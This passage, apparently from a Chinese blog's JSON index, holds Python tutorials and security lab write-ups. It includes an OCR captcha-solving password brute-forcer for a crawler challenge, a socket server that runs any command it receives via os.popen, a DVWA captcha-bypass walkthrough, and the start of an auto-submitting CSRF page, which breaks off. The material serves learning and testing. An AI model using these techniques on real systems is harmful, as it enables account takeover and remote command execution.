'4', '23': '9', '3': '8', '11': '4', '97': '6', '82': '9', '14': '1', '87': '6', '78': '6', '31': '4', '95': '9', '68': '7', '88': '4', '35': '5' &#125; 整理后的密码： 1password = 3381830867445135357748950695244329548946136479903948743260484371348776618136963449163264706489936702 第五关的url依旧要靠猜 Pass-5网址：http://www.heibanke.com/lesson/crawler_ex04/ 依然要登录，很明显这关要提交验证码，观察一下源代码 可以发现这个验证码其实是一个url，点击进去能看到验证码的图片，跟token一样，每次刷新页面，验证码的url都会变化，因此验证码就会一直变化 所以，我们要通这最后一关，就必须要想办法获取这个验证码的值 在Python中，有一个库叫pytesseract，这个库里的image_to_string方法具有识别图片中信息的功能 由于这个库跟requests一样，是第三方库，因此我们需要先安装后才能使用 除了pytesseract库之外，我们还依赖PIL库的Image方法打开一个图片 安装这两个库都可以用pip命令安装 比较关键的是pytesseract库识别验证码还依赖于一个插件Tesseract-OCR ，这个插件我们可以百度搜索tesseract-ocr-setup-3.02.02.exe 下载，这里我使用的是3.02版本，没有碰到什么问题，按照安装提示一步步下载下来，唯一要注意的是要按照默认路径下载，Windows的默认安装路径是C:\\Program Files (x86)\\Tesseract-OCR\\ 这是因为我们下载完后需要在Python文件夹的下的\\Lib\\site-packages\\pytesseract\\pytesseract.py修改源代码中 1tesseract_cmd = 'tesseract' 修改为： 1tesseract_cmd = r'C:\\Program Files (x86)\\Tesseract-OCR\\tesseract.exe' 安装完成后，我们就可以获取验证码了，除了验证码外，我们还要获取三个值：登录界面的token值，关卡界面的token值，关卡界面的captcha_1 值 需要注意的是，我们用pytesseract库虽然可以识别验证码，但并不是百分百正确，所以我们需要对验证码进行校验，经过观察本关的验证码都是四个大小写英文字母，我们可以通过正则匹配进行校验，如果校验失败，则继续识别，直到校验成功，则提交猜测的密码，这里密码从0开始递增猜测 代码如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485import requestsimport pytesseractimport refrom bs4 import BeautifulSoupfrom PIL import Imagefrom io import BytesIOlogin_url = 'http://www.heibanke.com/accounts/login/?next=/lesson/crawler_ex04/'pass_url = 'http://www.heibanke.com/lesson/crawler_ex04/'s = requests.Session()def getToken(html): soup = BeautifulSoup(html,'html.parser') token = soup.find_all('input')[0]['value'] return tokendef getCaptcha_0(html): soup = BeautifulSoup(html,'html.parser') Captcha_0 = soup.find('input',id=\"id_captcha_0\")['value'] return Captcha_0def login(): r = s.get(url=login_url) login_token = getToken(r.text) login_data = &#123; 'csrfmiddlewaretoken':login_token, 'username':'xxx', 'password':'xxx' &#125; login = s.post(url=login_url,data=login_data) if '这里是黑板客爬虫闯关的第五关' in login.text: print('login successfully!')def getImageURL(html): soup = BeautifulSoup(html,'html.parser') imageURL = 'http://www.heibanke.com'+soup.find('img',class_='captcha')['src'] return imageURLdef getImageCode(): while True: print('--------------------开始识别验证码') pas = s.get(url=pass_url) imageURL = getImageURL(pas.text) image = s.get(url=imageURL) captcha_img = Image.open(BytesIO(image.content)) imageCode = pytesseract.image_to_string(captcha_img) print('验证码识别结果:',imageCode) print('--------------------开始校验验证码') match = re.search(r'^[A-Z | a-z]&#123;4&#125;$',imageCode) if not match: print('验证码:',imageCode,'校验结果识别失败，继续识别') else: print('验证码:',imageCode,'校验成功') mess = (imageCode,pas) break return messdef guess(): password = 0 while True: print('--------------------------------------开始猜测密码') imageCode,pas = getImageCode() pas_token = getToken(pas.text) Captcha_0 = getCaptcha_0(pas.text) data = &#123; 'csrfmiddlewaretoken':pas_token, 'username':'aaa', 'password':password, 'captcha_0':Captcha_0, 'captcha_1':imageCode &#125; g = s.post(url=pass_url,data=data) if '验证码输入错误' in g.text: print('验证码输入错误') elif '您输入的密码错误' in g.text: print('密码:',password,'错误') password +=1 else : print('密码:',password,'正确') print('返回的页面结果:') print(g.text) break login()guess() 这关坑还是很多的，主要是识别校验码的正确率有点低，即使校验结果是四个英文字母，也不一定是正确的验证码，而且密码是随着时间变化的，总之耐心尝试吧，有了思路多尝试最后总是能成功的 最后我的时间段检测到的正确密码： 在浏览器提交密码19 最后附上参考的链接：https://www.jianshu.com/p/f64853b8f7e9","categories":[{"name":"Python爬虫","slug":"Python爬虫","permalink":"https://Foxgrin.github.io/categories/Python爬虫/"}],"tags":[{"name":"Python","slug":"Python","permalink":"https://Foxgrin.github.io/tags/Python/"}]},{"title":"Python网络编程(二)","slug":"Python网络编程(二)","date":"2018-07-24T14:39:00.000Z","updated":"2018-07-25T01:58:14.254Z","comments":true,"path":"/posts/24856/","link":"","permalink":"https://Foxgrin.github.io/posts/24856/","excerpt":"在上篇文章中，我们了解了Python网络编程的基础模块socket，并利用threading模块实现了多线程处理以及模拟了代理的过程，这篇文章了解一下Python中更为实用，功能更加强大的socketserver模块，用法也更为简单，同时我们也试着实现模拟burp抓取http头部","text":"在上篇文章中，我们了解了Python网络编程的基础模块socket，并利用threading模块实现了多线程处理以及模拟了代理的过程，这篇文章了解一下Python中更为实用，功能更加强大的socketserver模块，用法也更为简单，同时我们也试着实现模拟burp抓取http头部 socketserver库python 3是将python 2中的SocketServer库的大写取消，即socketserver库 首先介绍一下socketserver库的五个重要的类： 1.BaseServe：这个类是模块里最基本的类，所有的类源头都来至于这个基类，但是他不是用于实例或使用的 2.TCPServer：这个类用于TCP/ip的socket通讯 3.UDPServer：这个类用于UDP的socket通讯 4.UnixStreamServer 5.UnixDatagramServer :使用的Unix - domain sockets通讯，并且只能Unix平台使用 可能看不太懂，无所谓，我们只需要关心它的基本使用方法即可 (1)首先我们先导入socketserver库，这个就不用多说了 1import socketserver (2)然后我们需要自定义一个类，用这个类来继承socketserver库中的BaseRequestHandler类，然后重写BaseRequestHandler类中的handle方法，其实就是自定义我们通讯的接收与发送过程 123456class MyTCPServer(socketserver.BaseRequestHandler): def handle(self): self.data = self.request.recv(1024) print(bytes.decode(self.data)) self.reply = input('reply: ') self.request.sendall(str.encode(self.reply)) 这里的self.request.recv()和self.request.sendall()其实就相当于我们socket模块中的recv和send方法 (3)接下来我们在主函数中使用socketserver的ThreadingTCPServer方法实例化一个对象server，传入元组(ip,端口)和我们定义的继承类，然后使用serve_forever()来启动服务 123if __name__=='__main__': server = socketserver.ThreadingTCPServer(('',6666),MyTCPServer) server.serve_forever() 可以看出，对比与socket库，我们简化了初始socket，绑定端口ip，开始监听的过程，只需要去规定发送与接收信息的流程，并且支持多线程，短短几行代码就可以实现我们之前通过复杂的代码实现的效果 下面附上一个简单的Server端和Client端的实例： Server端： 123456789101112131415161718192021import socketserverclass MyTCPServer(socketserver.BaseRequestHandler): def handle(self): print('Connected By',self.client_address) self.request.send(str.encode('Welcome to TCPServer!')) while True: self.data = self.request.recv(1024) self.data = bytes.decode(self.data) if(self.data == 'exit'): print('Client',self.client_address,'has lost') break print('The data from',self.client_address,'is',self.data) self.reply = input('reply to client: ') self.request.send(str.encode(self.reply))if __name__=='__main__': HOST = 'localhost' PORT = 6666 server = socketserver.ThreadingTCPServer((HOST,PORT),MyTCPServer) server.serve_forever() Client端： 123456789101112131415from socket import *c = socket(AF_INET,SOCK_STREAM)c.connect(('127.0.0.1',6666))message = c.recv(1024)print(bytes.decode(message))while True: data = input('data: ') if data == 'exit': c.send(str.encode(data)) break c.send(str.encode(data)) reply = c.recv(1024) print('The reply from TCPServer is',bytes.decode(reply))c.close() 模拟burp抓取http包想必大家都用过burp，它相当于一个我们使用的客户端与要访问的服务器之间的一个代理，我们要发送到服务器的http请求报文都会通过burp，被burp拦截下来，然后burp可以分析我们发送的http请求包头 在学习了socket后，我们可以试着模拟一下代理的过程，首先我们先试着抓取http请求 代码如下： 12345678910from socket import *s = socket(AF_INET,SOCK_STREAM)s.bind(('localhost',8080))s.listen(5)sock,addr = s.accept()header = bytes.decode(sock.recv(1024))print(header)sock.close()s.close() 代码很简单，就是利用socket库的基本方法，这里监听的是本地的8080端口，也就是说我们设置浏览器的代理地址是127.0.0.1，端口是8080 接下来启动程序，在浏览器中输入网址，监听到http包头 然后我们要想办法获取访问的主机名，这里利用正则匹配获得 123import rematch = re.search(r'Host:\\s(.*)\\s',http)CHOST = match.group(1) 获取了访问的主机名，我们就可以连接至访问主机，然后将http包头发送给目标主机，再将目标主机返回的信息发回给本地主机，就可以实现代理了，代码如下： 123456789101112131415161718192021222324252627282930313233import socketserverimport refrom socket import *def getHost(http): match = re.search(r'Host:\\s(.*)\\s',http) CHOST = match.group(1) return CHOSTclass MyProxy(socketserver.BaseRequestHandler): def handle(self): self.http = self.request.recv(1024) self.http = bytes.decode(self.http) print(self.http) self.CHOST = getHost(self.http) c = socket(AF_INET,SOCK_STREAM) c.connect((self.CHOST,80)) c.send(str.encode(http)) response = [] while True: data = c.recv(1024) if data: response.append(data) else: break self.response = ''.join(response) self.sendall(self.response) if __name__=='__main__': LHOST = 'localhost' LPORT = 8080 server = socketserver.ThreadingTCPServer((LHOST,LPORT),MyProxy) server.serve_forever() 这个程序实践过程中很明显的会出现很多不可预料的错误，要解决这些只能更详细的学习代理的协议，但是简单的思路还是没错的","categories":[{"name":"Python学习笔记","slug":"Python学习笔记","permalink":"https://Foxgrin.github.io/categories/Python学习笔记/"}],"tags":[{"name":"Python","slug":"Python","permalink":"https://Foxgrin.github.io/tags/Python/"}]},{"title":"Python网络编程(一)","slug":"Python网络编程(一)","date":"2018-07-22T08:00:00.000Z","updated":"2018-07-23T03:56:44.075Z","comments":true,"path":"/posts/41404/","link":"","permalink":"https://Foxgrin.github.io/posts/41404/","excerpt":"Socket是网络编程的一个非常重要的基础，而Python的Socket标准库也提供了非常完善且易用的语法，这篇文章简单介绍一下Socket库的基本用法，以及结合os标准库，threading多线程库实现远程SSH通信，最后模拟TCP代理交互的过程","text":"Socket是网络编程的一个非常重要的基础，而Python的Socket标准库也提供了非常完善且易用的语法，这篇文章简单介绍一下Socket库的基本用法，以及结合os标准库，threading多线程库实现远程SSH通信，最后模拟TCP代理交互的过程 Socket库基本用法Socket是任何一种计算机网络通讯最基础的内容，例如当你在浏览器地址栏中输入一个网址时，你就会打开一个套接字，任何连接到指定的网址并读取响应的页面然后显示出来，在Python中使用Socket库进行通信的对象无非就是两个，一个是服务器端，一个是客户端 服务器端的主要流程： (1)初始化socket()，创建套接字 12import sockets = socket.socket(AF_INET,SOCK_STREAM) 这里socket函数是初始化socket，里面的参数默认是AF_INET和SOCK_STREAM (2)使用bind()绑定服务器端的ip和端口 1s.bind(('127.0.0.1',6666)) 这里注意传入的参数是一个元组，包含了ip地址和端口号 (3)使用listen()监听消息 1s.listen(5) 这里的参数最大值为5 (4)使用accept()获取客户端的套接字地址 1sock,addr = s.accept() 这个函数有点类似input函数，input函数是等待用户输入才会执行下一步，而accept函数则等待用户的连接才执行下一步，返回也是一个元组(conn,address)，其中conn是新的套接字对象，可以用来接收和发送数据，address是连接的客户端地址 (5)使用recv()接收数据，send()发送数据与客户端进行交互 12text = sock.recv(1024)sock.send(data) 这里要注意的是在Python 3中send()中的参数必须是字节类型 客户端的主要流程： (1)初始化socket()，创建套接字 1c = socket.socket(AF_INET,SOCK_STREAM) (2)使用connect()指定连接的ip和端口号连接至指定服务器端 1c.connect(('127.0.0.1',6666)) 同样的，参数必须是元组，包括要连接的服务器的ip地址和端口号 (3)使用recv()接收数据，send()发送数据与服务器端进行交互 12text = c.recv(1024)c.send(data) 其实使用socket库其实就只需要注意send()与recv()需要对应起来，不然可能导致客户端或者服务器端处于挂起的状态 下面我们就来看一个简单的服务器端和客户端的一个例子 Server(服务器端) 123456789101112131415from socket import *s=socket(AF_INET,SOCK_STREAM) #初始化socket，创建套接字s.bind(('localhost',6666)) #绑定服务器ip地址和端口s.listen(5) #开始监听while True: sock,addr=s.accept() #等待客户端连接，获取客户端套接字地址 print('Connected By',addr) sock.send(str.encode('Welcome to Server!')) #向客户端发送数据 while True: data=sock.recv(1024) #接收客户端发送的数据 print(bytes.decode(data)) if not data: print('Client has lost') break Client(客户端) 12345678910from socket import *c=socket(AF_INET,SOCK_STREAM) #初始化套接字c.connect(('127.0.0.1',6666)) #连接服务器text=c.recv(1024)print(bytes.decode(text))for i in range(10): data=input() c.send(str.encode(data))c.close() 服务器端使用了死循环以保持一直处于监听状态，客户端发送10次信息与服务器端断开连接，之后服务器继续等待客户端连接，这个程序缺点是服务器端只能支持一个客户端连入，不能支持多个客户端同时连入 os库基本用法Python的os库提供了各种操作系统功能的接口，通过例子简单说明一下几种常用的函数 123456789101112131415import oscmd = input('Please input a command: ')a = os.system(cmd) #执行shell命令print(a) #返回值为0cmd = input('Please input a command: ')a = os.popen(cmd) #返回一个对象print(a.read())print(os.getcwd()) #获取当前目录print(os.listdir(os.getcwd())) #返回指定文件夹下包含的文件或文件夹的名字的列表os.chdir(os.getcwd()+'/test') #到达指定目录下os.system('test.py') 下面通过os库与socket库结合模拟SSH通信 服务器端： 123456789101112131415161718from socket import *import oss = socket(AF_INET,SOCK_STREAM)s.bind(('localhost',6666))s.listen(5)while True: sock,addr = s.accept() print('Connected By',addr) sock.send(str.encode('Welcome to the SSHServer!')) while True: cmd = sock.recv(1024) cmd = bytes.decode(cmd) if cmd == 'exit': print('Client has lost') break result = os.popen(cmd).read() sock.send(str.encode(result)) 客户端： 123456789101112131415from socket import *import osc = socket(AF_INET,SOCK_STREAM)c.connect(('127.0.0.1',6666))text = c.recv(1024)print(bytes.decode(text))while True: cmd = input('Please input a command: ') c.send(str.encode(cmd)) if cmd == 'exit': c.close() break result = c.recv(1024) print(bytes.decode(result)) 当客户端输入exit时，断开与服务器的连接。同样的，这里的服务器端还是只能与一个客户端连接 利用threading库实现多线程连接服务器端： 12345678910111213141516171819202122232425from socket import *from threading import Threadfrom time import sleepimport osdef ThreadHandle(sock,addr): while True: cmd = sock.recv(1024) cmd = bytes.decode(cmd) if cmd == 'exit': print(addr,'has lost') break result = os.popen(cmd).read() sock.send(str.encode(result))s = socket(AF_INET,SOCK_STREAM)s.bind(('localhost',6666))s.listen(5)while True: sock,addr = s.accept() print('Connected By',addr) sock.send(str.encode('Welcome to SSHServer!')) t = Thread(target=ThreadHandle,args=(sock,addr)) sleep(0.1) t.start() 客户端： 123456789101112131415from socket import *import osc = socket(AF_INET,SOCK_STREAM)c.connect(('127.0.0.1',6666))text = c.recv(1024)print(bytes.decode(text))while True: cmd = input('Please input a command: ') c.send(str.encode(cmd)) if cmd == 'exit': c.close() break result = c.recv(1024) print(bytes.decode(result)) 服务器端使用了threading标准库的Thread函数开启了多线程，即每个连接都是一个单独的进程 模拟TCP代理我们假设服务器与客户端因为某种原因不能直接通信，这时候就需要一个中间的代理将客户端的信息转发到服务器，再接收服务器返回的数据再转发给客户端，这就是代理的原理 如果我们把Python中一个socket代表一个连接，那么代理既要与客户端连接又要与服务器连接，就需要两个socket 我们先来编写服务器端和客户端，跟前面的例子一样，不说明了 服务器端： 1234567891011121314151617from socket import *import oss = socket(AF_INET,SOCK_STREAM)s.bind(('localhost',6666))s.listen(5)while True: sock,addr = s.accept() print('Connected By',addr) while True: cmd = sock.recv(1024) cmd = bytes.decode(cmd) if cmd == 'exit': print('TCPClient has lost') break result = os.popen(cmd).read() sock.send(str.encode(result)) 客户端： 12345678910111213141516171819from socket import *HOST = '127.0.0.1'PORT = input('Please input a PORT to connect: ')PORT = int(PORT)c = socket(AF_INET,SOCK_STREAM)c.connect((HOST,PORT))text = c.recv(1024)print(bytes.decode(text))while True: cmd = input('Please input a command: ') c.send(str.encode(cmd)) if cmd == 'exit': c.close() break result = c.recv(1024) result = bytes.decode(result) print(result) 接下来开始编写代理，首先我们先定义建立与客户端连接的socket的函数 1234567891011121314151617181920def Server(LPORT,CHOST,CPORT): c = Client(CHOST,CPORT) s = socket(AF_INET,SOCK_STREAM) s.bind(('localhost',LPORT)) s.listen(5) while True: sock,addr = s.accept() print('Connected By',addr) sock.send(str.encode('Welcome to TCPProxy!')) while True: cmd = sock.recv(1024) if bytes.decode(cmd) == 'exit': print('TCPClient '+addr+' has lost') Forward(c,cmd) c.close() break print('The command from TCPClient is: '+bytes.decode(cmd)) result = Forward(c,cmd) print('The result from TCPServer is: '+bytes.decode(result)) sock.send(result) 因为代理是接收客户端的数据再将数据转发至服务器，再把服务器返回的结果转发到客户端。所以我们不妨把代理看成是客户端的服务器，因此定义函数名为Server，等待客户端的连接，虽然它不然处理客户端发来的数据，但是它可以将数据转发服务器端让服务器端代为处理，这里的参数LPORT是代理绑定的端口号，CHOST和CPORT是传入Client函数的参数，也就是后面讲代理看作是客户端与服务器端连接。 与客户端建立连接后，接收客户端的数据打印出来后，将数据通过Forward函数转发至服务器端，当客户端输入exit命令时，代理将断开与服务器端的连接和客户端的连接并继续等待客户端的接入 接下来编写与服务器端连接的函数Client和转发数据的函数Forward 1234def Client(CHOST,CPORT): c = socket(AF_INET,SOCK_STREAM) c.connect((CHOST,CPORT)) return c 1234def Forward(c,cmd): c.send(cmd) result = c.recv(1024) return result 参数CHOST和CPORT是服务器端的IP和端口 再编写主函数： 12345678def main(): try: LPORT = int(sys.argv[1]) CHOST = sys.argv[2] CPORT = int(sys.argv[3]) Server(LPORT,CHOST,CPORT) except: usage() 这里用到了sys标准库的sys.argv[]，简单地说就是我们在cmd中输入执行python程序时获取的参数，假如我们在cmd命令行中输入test.py aaa bbb，那么sys.argv[0]就代表了字符串’test.py’，sys.argv[1]代表了字符串’aaa’，同理sys.argv[2]代表了字符串’bbb’，所以我们要执行这个代理的程序，不仅要输入python程序的文件名，还要同时输入三个参数，否则就出错而执行usage函数，我们就定义usage函数为这个程序的用法 12def usage(): print('TCPProxy.py [ListenedPORT] [ConnectedHOST] [ConnectedPORT]') 说明了执行这个代理程序应当输入的格式 下面附上代理端完整的代码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647from socket import *import sysdef usage(): print('TCPProxy.py [ListenedPORT] [ConnectedHOST] [ConnectedPORT]')def Server(LPORT,CHOST,CPORT): c = Client(CHOST,CPORT) s = socket(AF_INET,SOCK_STREAM) s.bind(('localhost',LPORT)) s.listen(5) while True: sock,addr = s.accept() print('Connected By',addr) sock.send(str.encode('Welcome to TCPProxy!')) while True: cmd = sock.recv(1024) if bytes.decode(cmd) == 'exit': print('TCPClient '+addr+' has lost') Forward(c,cmd) c.close() break print('The command from TCPClient is: '+bytes.decode(cmd)) result = Forward(c,cmd) print('The result from TCPServer is: '+bytes.decode(result)) sock.send(result)def Client(CHOST,CPORT): c = socket(AF_INET,SOCK_STREAM) c.connect((CHOST,CPORT)) return cdef Forward(c,cmd): c.send(cmd) result = c.recv(1024) return resultdef main(): try: LPORT = int(sys.argv[1]) CHOST = sys.argv[2] CPORT = int(sys.argv[3]) Server(LPORT,CHOST,CPORT) except: usage()main()","categories":[{"name":"Python学习笔记","slug":"Python学习笔记","permalink":"https://Foxgrin.github.io/categories/Python学习笔记/"}],"tags":[{"name":"Python","slug":"Python","permalink":"https://Foxgrin.github.io/tags/Python/"}]},{"title":"Python正则表达式","slug":"Python正则表达式","date":"2018-07-21T06:53:00.000Z","updated":"2018-07-21T14:22:28.172Z","comments":true,"path":"/posts/26030/","link":"","permalink":"https://Foxgrin.github.io/posts/26030/","excerpt":"好久没复习Python了，感觉很多东西都快忘了，趁着假期赶紧补一补基础","text":"好久没复习Python了，感觉很多东西都快忘了，趁着假期赶紧补一补基础 什么是正则正则表达式使用单个字符串来描述，匹配一系列符合某个句法规则的字符串，简单理解，就是对字符串的检索匹配和处理 Python 正则表达式Python通过re模块提供对正则表达式的支持 1.先将正则表达式的字符串形式编译为Pattern实例； 2.使用Pattern实例处理文本并获得匹配结果； 3.使用实例获得信息，进行其他的操作。 先熟知几个re模块常用的函数： (1)re.compile(pattern,flags=0) ​ re.match(pattern,string,flags=0) 来看下面一个例子： 12345&gt;&gt;&gt; import re&gt;&gt;&gt; pattern = re.compile('hello')&gt;&gt;&gt; match = pattern.match('hello world')&gt;&gt;&gt; print(match.group())hello 这个例子使用了re模块的compile函数生成一个正则表达式的pattern对象，该对象拥有一系列方法用于正则表达式的匹配和替换,简单而言就是规定了匹配的模式，而match函数则用来匹配，匹配成功则返回一个match对象，match对象通过group()返回被RE匹配的字符串 (2)re.findall(pattern,string,flags=0) 来看下面一个例子： 123&gt;&gt;&gt; import re&gt;&gt;&gt; re.findall('hello','hello world')['hello'] 这个例子使用了re模块的findall函数遍历匹配，可以获取字符串中所有匹配的字符串，返回一个列表，跟compile函数不同在于，findall函数能搜素出所有符合的字符串组成一个列表 (3)re.search(pattern,string,flags=0) 来看下面一个例子： 1234&gt;&gt;&gt; import re&gt;&gt;&gt; match = re.search('hello','hello world')&gt;&gt;&gt; match.group()'hello' 这个例子使用了re模块的search函数，跟match函数一样，只找到第一个匹配的字符串然后返回一个match对象 实例抓取i春秋网页的课程信息 代码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748import requestsimport refrom bs4 import BeautifulSoupurl=\"https://www.ichunqiu.com/courses/webaq\"header=&#123; 'Host': 'www.ichunqiu.com', 'Connection': 'close', 'Cache-Control': 'max-age=0', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36', 'Upgrade-Insecure-Requests': '1', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'Accept-Encoding': 'gzip, deflate', 'Accept-Language': 'zh-CN,zh;q=0.9' &#125;r=requests.get(url,headers=header)r.encoding=r.apparent_encodingsoup=BeautifulSoup(r.text,'html.parser')#获取课程名称classname=[]l=soup.find_all('div',class_='coursename')for i in l: classname.append(i['title'])#获取课程价格cost=re.findall(r'\\d*元|免费',str(soup))#获取课程课时和总时间time=re.findall(r'\\d*课时\\d*分钟',str(soup))#获取课程学习人数people=re.findall(r'\\d*人学习',str(soup))#整理课程所有信息classMessage=[]message=[]for i in range(20): message.append(classname[i]) message.append(cost[i]) message.append(time[i]) message.append(people[i]) classMessage.append(message) message=[]print('&#123;0:30s&#125;\\t&#123;1:8s&#125;\\t&#123;2:15s&#125;\\t&#123;3:15s&#125;'.format('课程名称','价格','课时及总时间','学习人数',chr(12288)))for i in classMessage: print('&#123;0:30s&#125;\\t&#123;1:8s&#125;\\t&#123;2:15s&#125;\\t&#123;3:15s&#125;'.format(i[0],i[1],i[2],i[3],chr(12288))) print() 输出结果： 最后这里因为中文英文字符所占字节不同，所以死活对不齐…也利用了chr(12288)填充的办法还是行不通，希望有大神能告知如何解决，感激不尽 特殊字符 一般字符 匹配自身 abc abc . 匹配任意换行符”\\n”以外的字符 a.c abc \\ 转义字符，是最后一个字符改变原来的意思。用于在正则表达式中转义一些特殊字符 a\\.c a\\\\c a.c a\\c […] 字符集。对应的位置可以是字符串集中任意1个字符。字符集中的字符可以逐个列出，也可以给出范围，如[abc]或[a-c]，第一个字符如果是^则表示取反，如[^abc]表示不是abc的其他字符。所有的特殊字符在字符集中都失去原来的特殊含义，在字符集中如果要使用]，-或^，可以在前面加上反斜杠 a[bcd]e abe ace ade 字符集 预定义字符（可以写在[…]中） 含义 例子 符合匹配的例子 \\d 数字：[0-9] a\\dc a1c,a9c \\D 非数字：[^\\d] a\\Dc abc,a c \\s 空白字符：[&lt;空格&gt;\\t\\r\\f\\v] a\\sc a c \\S 非空白字符：[^\\s] a\\Sc abc,a1c \\w 单词字符：[A-Za-z0-9] a\\wc abc,a1c,aBc \\W 非单词字符：[^\\w] a\\Wc a c,a.c 数量词 数量词 含义 例子 符合匹配的例子 * 匹配前一次字符0次或无限次 abc* ab,abccc + 匹配前一个字符1次或无限次 abc+ abc,abccc ? 匹配前一个字符0次或1次 abc? ab,abc {m} 匹配前一个字符m次 ab{2}c abbc {m,n} 匹配前一个字符m到n次 ab{1,2}c abc,abbc 逻辑，分组 字符 含义 例子 符合匹配的例子 或运算符 代表左右表达式任意匹配一个，它总是先尝试匹配左边的表达式，一旦成功匹配则跳过右边的表达式，如果或运算符没有包括在()中，则它的范围是整个正则表达式 abc或def abc def (…) 被括起来的表达式将作为分组，从表达式左边开始每遇到一个分组的左括号，编号+1分组表达式作为一个整体，可以后接数量词，表达式中或运算符仅在该组中有效 (abc){2} a(123或456)c abcabc a123c,a456c 贪婪模式和非贪婪模式正则表达式通常用于在文本中查找匹配的字符串。Python里的数量词默认是贪婪的，意思是总是尝试匹配尽可能多的字符；非贪婪的则相反，总是尝试匹配尽可能少的字符。 例如：正则表达式”ab*“如果用于查找”abbbc”，将匹配到”abbb”。而如果使用非贪婪方法(在数量词后面加上?，则使用非贪婪方法匹配)，如”ab*?”，将找到”a”","categories":[{"name":"Python学习笔记","slug":"Python学习笔记","permalink":"https://Foxgrin.github.io/categories/Python学习笔记/"}],"tags":[{"name":"Python","slug":"Python","permalink":"https://Foxgrin.github.io/tags/Python/"}]},{"title":"dvwa-Insecure CAPTCHA","slug":"dvwa-Insecure CAPTCHA","date":"2018-07-16T06:10:00.000Z","updated":"2018-07-16T08:02:16.296Z","comments":true,"path":"/posts/51335/","link":"","permalink":"https://Foxgrin.github.io/posts/51335/","excerpt":"总结了dvwa中关于不安全的验证码的关卡","text":"总结了dvwa中关于不安全的验证码的关卡 Low代码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475&lt;?php if( isset( $_POST[ &apos;Change&apos; ] ) &amp;&amp; ( $_POST[ &apos;step&apos; ] == &apos;1&apos; ) ) &#123; // Hide the CAPTCHA form $hide_form = true; // Get input $pass_new = $_POST[ &apos;password_new&apos; ]; $pass_conf = $_POST[ &apos;password_conf&apos; ]; // Check CAPTCHA from 3rd party $resp = recaptcha_check_answer( $_DVWA[ &apos;recaptcha_private_key&apos; ], $_SERVER[ &apos;REMOTE_ADDR&apos; ], $_POST[ &apos;recaptcha_challenge_field&apos; ], $_POST[ &apos;recaptcha_response_field&apos; ] ); // Did the CAPTCHA fail? if( !$resp-&gt;is_valid ) &#123; // What happens when the CAPTCHA was entered incorrectly $html .= &quot;&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;&quot;; $hide_form = false; return; &#125; else &#123; // CAPTCHA was correct. Do both new passwords match? if( $pass_new == $pass_conf ) &#123; // Show next stage for the user echo &quot; &lt;pre&gt;&lt;br /&gt;You passed the CAPTCHA! Click the button to confirm your changes.&lt;br /&gt;&lt;/pre&gt; &lt;form action=\\&quot;#\\&quot; method=\\&quot;POST\\&quot;&gt; &lt;input type=\\&quot;hidden\\&quot; name=\\&quot;step\\&quot; value=\\&quot;2\\&quot; /&gt; &lt;input type=\\&quot;hidden\\&quot; name=\\&quot;password_new\\&quot; value=\\&quot;&#123;$pass_new&#125;\\&quot; /&gt; &lt;input type=\\&quot;hidden\\&quot; name=\\&quot;password_conf\\&quot; value=\\&quot;&#123;$pass_conf&#125;\\&quot; /&gt; &lt;input type=\\&quot;submit\\&quot; name=\\&quot;Change\\&quot; value=\\&quot;Change\\&quot; /&gt; &lt;/form&gt;&quot;; &#125; else &#123; // Both new passwords do not match. $html .= &quot;&lt;pre&gt;Both passwords must match.&lt;/pre&gt;&quot;; $hide_form = false; &#125; &#125; &#125; if( isset( $_POST[ &apos;Change&apos; ] ) &amp;&amp; ( $_POST[ &apos;step&apos; ] == &apos;2&apos; ) ) &#123; // Hide the CAPTCHA form $hide_form = true; // Get input $pass_new = $_POST[ &apos;password_new&apos; ]; $pass_conf = $_POST[ &apos;password_conf&apos; ]; // Check to see if both password match if( $pass_new == $pass_conf ) &#123; // They do! $pass_new = mysql_real_escape_string( $pass_new ); $pass_new = md5( $pass_new ); // Update database $insert = &quot;UPDATE `users` SET password = &apos;$pass_new&apos; WHERE user = &apos;&quot; . dvwaCurrentUser() . &quot;&apos;;&quot;; $result = mysql_query( $insert ) or die( &apos;&lt;pre&gt;&apos; . mysql_error() . &apos;&lt;/pre&gt;&apos; ); // Feedback for the end user echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; &#125; else &#123; // Issue with the passwords matching echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;; $hide_form = false; &#125; mysql_close(); &#125; ?&gt; 代码很长，但是我们并不需要所有的代码，关键代码在于服务器的两个执行流程，首先会使用Google提供reCAPTCHA服务，这个服务会产生一个验证码(PS:访问到这个验证码需要翻墙，这里没有翻墙，所以显示不出验证码，但不影响我们的测试)，待用户输入验证码之后调用一个recaptcha_check_answer函数检查用户输入的正确性，该函数具体语法如下： recaptcha_check_answer($privkey,$remoteip, $challenge,$response) 参数$privkey是服务器申请的private key，$remoteip是用户的ip，$challenge是recaptcha_challenge_field字段的值，来自前端页面 ，$response是recaptcha_response_field字段的值。函数返回ReCaptchaResponse class的实例，ReCaptchaResponse类有2个属性 ：$is_valid是布尔型的，表示校验是否有效，$error是返回的错误代码。 若校验成功，服务器会返回一个修改密码的表单，待用户修改密码 那么就有个疑问，是不是一定要通过输入正确的验证码才能修改得了密码呢，服务器的意思虽然是这样，但是我们仔细观察源代码，发现了一个很关键的参数$_POST[‘step’]，服务器只是根据这个参数的值来分别执行校验和修改密码的两个流程，说到这里，就很明白了，我们只需要修改step的值为2，就能轻松的跳过校验过程，所以说这个验证码是不安全的，或者说这是一个不安全的校验过程 我们利用burp抓包修改step值 成功修改密码为admin 还可以利用CSRF攻击的原理诱骗受害者访问一个攻击页面，攻击页面伪造请求给服务器修改密码 攻击页面代码如下： 12345678910111213141516&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;test&lt;/title&gt;&lt;/head&gt;&lt;body onload=&quot;document.getElementById(&apos;transfer&apos;).submit()&quot;&gt;&lt;form id=&apos;transfer&apos; method=&apos;post&apos; 